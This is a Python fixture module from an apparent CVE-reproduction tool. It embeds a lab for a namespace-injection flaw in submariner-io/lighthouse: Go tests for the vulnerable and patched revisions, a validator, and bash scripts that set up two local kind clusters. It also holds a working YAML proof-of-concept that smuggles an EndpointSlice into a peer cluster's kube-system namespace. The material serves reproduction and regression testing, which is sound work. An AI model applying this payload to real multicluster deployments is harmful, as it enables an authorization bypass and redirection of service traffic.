# Copyright 2026 SyncBit Software SRL and the CVELab contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Golden reference lab for CVE-2026-66788 (submariner-io/lighthouse).

These assets were handwritten after matching the public upstream diff to the
CVE mechanism, and CVELab once emitted them directly whenever that identifier
was passed. That made one CVE reproduce perfectly for reasons no other CVE
could benefit from, and made the tool look as though it were hardcoded against
its own demonstration.

They live here instead, as a regression fixture. The Shipyard runner contract
is asserted against them, so a change that breaks the Kubernetes profile still
fails a test, while the generator itself treats CVE-2026-66788 exactly like any
other identifier.

The commit pair below was verified by hand against the upstream fix. It is kept
because establishing it took real work, and it is a useful reference when
testing the resolver against a case whose correct answer is known.
"""

CURATED_REFERENCE = {
    "cve": "CVE-2026-66788",
    "repo": "https://github.com/submariner-io/lighthouse.git",
    "vulnerable_ref": "9ba8e0eeeacb42946379e503254487a0d69e0eb2",
    "fixed_ref": "e4f5bf97e048ad380d1c6b00b1e7fc596bc195af",
    "provenance": "Upstream namespace-validation security fix, 2026-08-11",
}

LIGHTHOUSE_VULNERABLE_TEST = r'''package controller

import (
    "testing"

    "github.com/submariner-io/admiral/pkg/syncer"
    "github.com/submariner-io/lighthouse/pkg/constants"
    discovery "k8s.io/api/discovery/v1"
    metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func TestCVELabNamespaceInjection(t *testing.T) {
    endpointSlice := &discovery.EndpointSlice{ObjectMeta: metav1.ObjectMeta{
        Name: "cvelab-marker",
        Labels: map[string]string{constants.LabelSourceNamespace: "kube-system"},
    }}
    result, requeue := (&EndpointSliceController{}).onRemoteEndpointSlice(endpointSlice, 0, syncer.Create)
    if requeue || result == nil || result.(*discovery.EndpointSlice).Namespace != "kube-system" {
        t.Fatalf("expected vulnerable revision to accept attacker-controlled kube-system namespace")
    }
    t.Log("CVELAB: vulnerable upstream revision accepted kube-system destination")
}
'''

LIGHTHOUSE_PATCHED_TEST = r'''package controller

import (
    "testing"

    "github.com/submariner-io/admiral/pkg/syncer"
    "github.com/submariner-io/lighthouse/pkg/constants"
    discovery "k8s.io/api/discovery/v1"
    metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
    "k8s.io/apimachinery/pkg/runtime"
    dynamicfake "k8s.io/client-go/dynamic/fake"
)

func TestCVELabNamespaceInjection(t *testing.T) {
    endpointSlice := &discovery.EndpointSlice{ObjectMeta: metav1.ObjectMeta{
        Name: "cvelab-marker",
        Labels: map[string]string{constants.LabelSourceNamespace: "kube-system"},
    }}
    controller := &EndpointSliceController{
        localClient: dynamicfake.NewSimpleDynamicClient(runtime.NewScheme()),
        namespaceValidator: &NamespaceValidator{denyList: []string{"kube-", "openshift-", "openshift"}},
    }
    result, requeue := controller.onRemoteEndpointSlice(endpointSlice, 0, syncer.Create)
    if requeue || result != nil {
        t.Fatalf("expected fixed revision to reject attacker-controlled kube-system namespace")
    }
    t.Log("CVELAB: fixed upstream revision rejected kube-system destination")
}
'''

LIGHTHOUSE_VALIDATOR_PY = r'''import json
import pathlib
import sys

result_path = pathlib.Path(__file__).resolve().parents[1] / "e2e" / "result.json"
if not result_path.is_file():
    raise SystemExit("Missing authentic E2E result: run the lab before invoking the validator")

result = json.loads(result_path.read_text(encoding="utf-8"))
vulnerable = result.get("vulnerable", {})
patched = result.get("patched", {})
valid = (
    result.get("attack_executed") is True
    and result.get("proof_quality") == "end_to_end_security_effect_observed"
    and result.get("differential_confirmed") is True
    and vulnerable.get("confirmed") is True
    and "198.51.100.77" in vulnerable.get("evidence", "")
    and patched.get("confirmed") is False
    and patched.get("rejection_logged") is True
    and "Rejecting EndpointSlice" in patched.get("rejection_log", "")
)
print(json.dumps(result, indent=2))
sys.exit(0 if valid else 1)
'''

LIGHTHOUSE_E2E_POC_YAML = r'''apiVersion: v1
kind: Namespace
metadata:
  name: cvelab-source
---
apiVersion: v1
kind: Service
metadata:
  name: cvelab
  namespace: cvelab-source
spec:
  clusterIP: None
  ports:
    - name: http
      port: 8080
---
apiVersion: multicluster.x-k8s.io/v1alpha1
kind: ServiceExport
metadata:
  name: cvelab
  namespace: cvelab-source
---
apiVersion: discovery.k8s.io/v1
kind: EndpointSlice
metadata:
  name: cvelab-exploit
  namespace: cvelab-source
  labels:
    kubernetes.io/service-name: cvelab
    multicluster.kubernetes.io/service-name: cvelab
    endpointslice.kubernetes.io/managed-by: lighthouse-agent.submariner.io
    lighthouse.submariner.io/sourceNamespace: kube-system
addressType: IPv4
ports:
  - name: http
    protocol: TCP
    port: 8080
endpoints:
  - addresses: ["198.51.100.77"]
    conditions:
      ready: true
'''

LIGHTHOUSE_E2E_RUN_SH = r'''#!/usr/bin/env bash
set -euo pipefail

LAB_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK_ROOT="/tmp/cvelab-CVE-2026-66788-e2e"
RESULT="$LAB_ROOT/e2e/result.json"
export PATH="$HOME/.local/bin:$PATH"
OWNERSHIP_FILE=""

safe_cleanup() {
  test -n "$OWNERSHIP_FILE" && test -s "$OWNERSHIP_FILE" || return 0
  while IFS='|' read -r kind name expected_id; do
    if [[ "$kind" == "container" ]]; then
      current_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker rm -fv "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign container $name: Docker ID changed." >&2
      fi
    elif [[ "$kind" == "network" ]]; then
      current_id="$(docker network inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker network rm "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign network $name: Docker ID changed." >&2
      fi
    fi
  done < "$OWNERSHIP_FILE"
  rm -f "$OWNERSHIP_FILE"
}

record_created_resources() {
  local network_preexisted="$1"
  : > "$OWNERSHIP_FILE"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    resource_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'container|%s|%s\n' "$name" "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  done
  if [[ "$network_preexisted" == "false" ]]; then
    resource_id="$(docker network inspect --format '{{.Id}}' kind 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'network|kind|%s\n' "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  fi
}

rm -rf "$WORK_ROOT"
mkdir -p "$WORK_ROOT"
# Shipyard's Dapper container mounts $HOME/.docker into /root/.docker.  Keep
# that mount isolated so tools running as root in the container cannot leave
# root-owned Buildx state in the invoking user's real Docker configuration.
mkdir -p "$WORK_ROOT/runner-home"
export HOME="$WORK_ROOT/runner-home"

run_variant() {
  local variant="$1"
  local expected="$2"
  local work="$WORK_ROOT/$variant"
  local network_preexisted=false
  # Keep the host Buildx state outside $HOME/.docker, which Dapper mounts into
  # its root-running container. Each variant receives a fresh configuration.
  export DOCKER_CONFIG="$WORK_ROOT/docker-config-$variant"
  mkdir -p "$DOCKER_CONFIG"
  OWNERSHIP_FILE="$work/.cvelab-owned-resources"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    if docker inspect "$name" >/dev/null 2>&1; then
      echo "Refusing to start: Docker container name $name is already in use." >&2
      return 4
    fi
  done
  if docker network inspect kind >/dev/null 2>&1; then
    network_preexisted=true
  fi
  cp -a "$LAB_ROOT/source/$variant/." "$work"
  while IFS= read -r -d '' text_file; do
    if grep -Iq $'\r' "$text_file"; then
      sed -i 's/\r$//' "$text_file"
    fi
  done < <(find "$work" -type f -print0)
  cat > "$work/.shipyard.e2e.yml" <<'YAML'
---
submariner: true
nodes: control-plane
clusters:
  cluster1:
  cluster2:
YAML
  cd "$work"
  git init -q
  git config user.name cvelab
  git config user.email cvelab@localhost
  git add -A
  git commit -qm "CVE lab source snapshot"
  local dapper_image="$variant:$(git branch --show-current)"

  if ! make deploy USING=wireguard; then
    record_created_resources "$network_preexisted"
    return 5
  fi
  record_created_resources "$network_preexisted"
  test "$(wc -l < "$OWNERSHIP_FILE")" -ge 3 || {
    echo "Unable to establish ownership of the Shipyard resources" >&2
    return 4
  }

  kubectl_tool() {
    docker run --rm --network kind \
      -v "$work:/workspace:ro" -v "$LAB_ROOT/e2e:/poc:ro" \
      --entrypoint /usr/sbin/kubectl "$dapper_image" "$@"
  }
  local host_k1="$work/output/kubeconfigs/kind-config-cluster1"
  local host_k2="$work/output/kubeconfigs/kind-config-cluster2"
  for kubeconfig in "$host_k1" "$host_k2"; do
    test -s "$kubeconfig" || { echo "missing kubeconfig: $kubeconfig" >&2; return 1; }
  done
  local k1="/workspace/output/kubeconfigs/kind-config-cluster1"
  local k2="/workspace/output/kubeconfigs/kind-config-cluster2"

  kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml
  kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
    --for=condition=Valid serviceexport/cvelab --timeout=180s
  kubectl_tool --kubeconfig "$k2" -n cvelab-source annotate endpointslice cvelab-exploit \
    cvelab.io/nonce="$(date +%s%N)" --overwrite

  local observed=false
  local evidence="not created in peer kube-system namespace"
  local rejection_log=""
  for _ in $(seq 1 60); do
    if kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
        -l lighthouse.submariner.io/source-name=cvelab-exploit \
        -o json | grep -q '"198.51.100.77"'; then
      observed=true
      evidence="$(kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
        -l lighthouse.submariner.io/source-name=cvelab-exploit -o json)"
      break
    fi
    sleep 2
  done

  if [[ "$variant" == "patched" ]]; then
    local agent_logs
    agent_logs="$(kubectl_tool --kubeconfig "$k1" -n submariner-operator logs \
      -l app=submariner-lighthouse-agent --tail=500)"
    rejection_log="$(grep -F 'Rejecting EndpointSlice from cluster' <<< "$agent_logs" | tail -n 1 || true)"
    test -n "$rejection_log" || {
      echo "patched object was absent, but no explicit agent rejection was logged" >&2
      return 3
    }
  fi

  VARIANT="$variant" EXPECTED="$expected" OBSERVED="$observed" EVIDENCE="$evidence" REJECTION_LOG="$rejection_log" \
    python3 - <<'PY' > "$LAB_ROOT/e2e/$variant.json"
import json, os
print(json.dumps({
    "variant": os.environ["VARIANT"],
    "expected": os.environ["EXPECTED"] == "true",
    "confirmed": os.environ["OBSERVED"] == "true",
    "evidence": os.environ["EVIDENCE"][:8000],
    "rejection_logged": bool(os.environ["REJECTION_LOG"]),
    "rejection_log": os.environ["REJECTION_LOG"][:2000],
}, indent=2))
PY

  if [[ "$observed" != "$expected" ]]; then
    echo "unexpected $variant result: observed=$observed expected=$expected" >&2
    return 2
  fi

  safe_cleanup
}

cleanup() {
  safe_cleanup
}
trap cleanup EXIT

run_variant vulnerable true
run_variant patched false

LAB_ROOT="$LAB_ROOT" python3 - <<'PY' > "$RESULT"
import json, os, pathlib
root = pathlib.Path(os.environ["LAB_ROOT"]) / "e2e"
vulnerable = json.loads((root / "vulnerable.json").read_text())
patched = json.loads((root / "patched.json").read_text())
result = {
    "attack_executed": True,
    "proof_quality": "end_to_end_security_effect_observed",
    "observable_effect": "malicious spoke EndpointSlice propagated through the real broker into peer kube-system",
    "evidence_type": "authorization_bypass",
    "evidence_origin": "two-cluster kind deployment running upstream Lighthouse agent and broker flow",
    "vulnerable": vulnerable,
    "patched": patched,
    "differential_confirmed": vulnerable["confirmed"] and not patched["confirmed"] and patched["rejection_logged"],
}
print(json.dumps(result, indent=2))
PY
'''

LIGHTHOUSE_MANUAL_POC_SH = r'''#!/usr/bin/env bash
set -euo pipefail

LAB_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK_ROOT="/tmp/cvelab-CVE-2026-66788-manual"
STATE="$WORK_ROOT/active-variant"
POC_FILE="$LAB_ROOT/artifacts/PoC.yaml"
export PATH="$HOME/.local/bin:$PATH"
OWNERSHIP_FILE="$WORK_ROOT/owned-resources"

# Dapper mounts $HOME/.docker into a root-running build container.  An
# isolated HOME prevents it from corrupting the user's Buildx state while the
# public images used by this lab do not require registry credentials.
mkdir -p "$WORK_ROOT/runner-home"
export HOME="$WORK_ROOT/runner-home"

safe_cleanup() {
  test -s "$OWNERSHIP_FILE" || return 0
  while IFS='|' read -r kind name expected_id; do
    if [[ "$kind" == "container" ]]; then
      current_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker rm -fv "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign container $name: Docker ID changed." >&2
      fi
    elif [[ "$kind" == "network" ]]; then
      current_id="$(docker network inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker network rm "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign network $name: Docker ID changed." >&2
      fi
    fi
  done < "$OWNERSHIP_FILE"
  rm -f "$OWNERSHIP_FILE"
}

record_created_resources() {
  local network_preexisted="$1"
  : > "$OWNERSHIP_FILE"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    resource_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'container|%s|%s\n' "$name" "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  done
  if [[ "$network_preexisted" == "false" ]]; then
    resource_id="$(docker network inspect --format '{{.Id}}' kind 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'network|kind|%s\n' "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  fi
}

active_variant() {
  test -s "$STATE" || { echo "No manual lab is active. Run setup first." >&2; exit 2; }
  cat "$STATE"
}

prepare_source() {
  local variant="$1"
  local work="$WORK_ROOT/$variant"
  local network_preexisted=false
  # Do not let the root-running Dapper container mount the host Buildx state.
  export DOCKER_CONFIG="$WORK_ROOT/docker-config-$variant"
  mkdir -p "$DOCKER_CONFIG"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    if docker inspect "$name" >/dev/null 2>&1; then
      echo "Refusing to start: Docker container name $name is already in use." >&2
      return 4
    fi
  done
  if docker network inspect kind >/dev/null 2>&1; then
    network_preexisted=true
  fi
  test ! -e "$STATE" || { echo "A manual lab is already active. Run cleanup first." >&2; exit 2; }
  rm -rf "$work"
  mkdir -p "$work"
  cp -a "$LAB_ROOT/source/$variant/." "$work"
  while IFS= read -r -d '' text_file; do
    if grep -Iq $'\r' "$text_file"; then sed -i 's/\r$//' "$text_file"; fi
  done < <(find "$work" -type f -print0)
  cat > "$work/.shipyard.e2e.yml" <<'YAML'
---
submariner: true
nodes: control-plane
clusters:
  cluster1:
  cluster2:
YAML
  cd "$work"
  git init -q
  git config user.name cvelab
  git config user.email cvelab@localhost
  git add -A
  git commit -qm "CVE manual PoC source snapshot"
  if ! make deploy USING=wireguard; then
    record_created_resources "$network_preexisted"
    return 5
  fi
  record_created_resources "$network_preexisted"
  test "$(wc -l < "$OWNERSHIP_FILE")" -ge 3 || {
    echo "Unable to establish ownership of the Shipyard resources" >&2
    return 4
  }
  mkdir -p "$WORK_ROOT"
  printf '%s' "$variant" > "$STATE"
  echo "Manual $variant lab is ready and will remain running."
  echo "Next: run exploit, inspect PoC.yaml, then run verify."
}

kubectl_tool() {
  local variant work branch dapper_image
  variant="$(active_variant)"
  work="$WORK_ROOT/$variant"
  branch="$(git -C "$work" branch --show-current)"
  dapper_image="$variant:$branch"
  docker image inspect "$dapper_image" >/dev/null 2>&1 || {
    echo "Missing Shipyard utility image: $dapper_image" >&2
    return 2
  }
  docker run --rm --network kind \
    -v "$work:/workspace:ro" -v "$LAB_ROOT:/lab:ro" \
    --entrypoint /usr/sbin/kubectl "$dapper_image" "$@"
}

exploit() {
  local k2="/workspace/output/kubeconfigs/kind-config-cluster2"
  test -f "$POC_FILE" || { echo "Missing $POC_FILE" >&2; exit 2; }
  kubectl_tool --kubeconfig "$k2" apply -f /lab/artifacts/PoC.yaml
  kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
    --for=condition=Valid serviceexport/cvelab --timeout=180s
  kubectl_tool --kubeconfig "$k2" -n cvelab-source annotate endpointslice cvelab-exploit \
    cvelab.io/nonce="$(date +%s%N)" --overwrite
  echo "Payload submitted from cluster2/cvelab-source. Run verify next."
}

verify() {
  local variant k1 evidence
  variant="$(active_variant)"
  k1="/workspace/output/kubeconfigs/kind-config-cluster1"
  evidence="$(kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
    -l lighthouse.submariner.io/source-name=cvelab-exploit -o yaml)"
  if grep -q '198.51.100.77' <<< "$evidence"; then
    printf '%s\n' "$evidence"
    if [[ "$variant" == "vulnerable" ]]; then
      echo "REPRODUCED: attacker-controlled EndpointSlice reached cluster1/kube-system."
      return 0
    fi
    echo "FAILED: patched variant propagated the payload." >&2
    return 1
  fi
  if [[ "$variant" == "patched" ]]; then
    local logs rejection
    logs="$(kubectl_tool --kubeconfig "$k1" -n submariner-operator logs \
      -l app=submariner-lighthouse-agent --tail=500)"
    rejection="$(grep -F 'Rejecting EndpointSlice from cluster' <<< "$logs" | tail -n 1 || true)"
    test -n "$rejection" || {
      echo "INCONCLUSIVE: object absent but explicit patch rejection was not logged." >&2; return 1;
    }
    echo "$rejection"
    echo "BLOCKED: object absent and patched agent explicitly rejected the EndpointSlice."
    return 0
  fi
  echo "NOT REPRODUCED: vulnerable variant did not propagate the payload." >&2
  return 1
}

cleanup() {
  safe_cleanup
  rm -rf "$WORK_ROOT"
  echo "Manual lab removed."
}

action="${1:-}"
case "$action" in
  setup)
    variant="${2:-vulnerable}"
    [[ "$variant" == "vulnerable" || "$variant" == "patched" ]] || {
      echo "Variant must be vulnerable or patched." >&2; exit 2;
    }
    prepare_source "$variant"
    ;;
  exploit) exploit ;;
  verify) verify ;;
  cleanup) cleanup ;;
  *) echo "Usage: manual.sh {setup [vulnerable|patched]|exploit|verify|cleanup}" >&2; exit 2 ;;
esac
'''
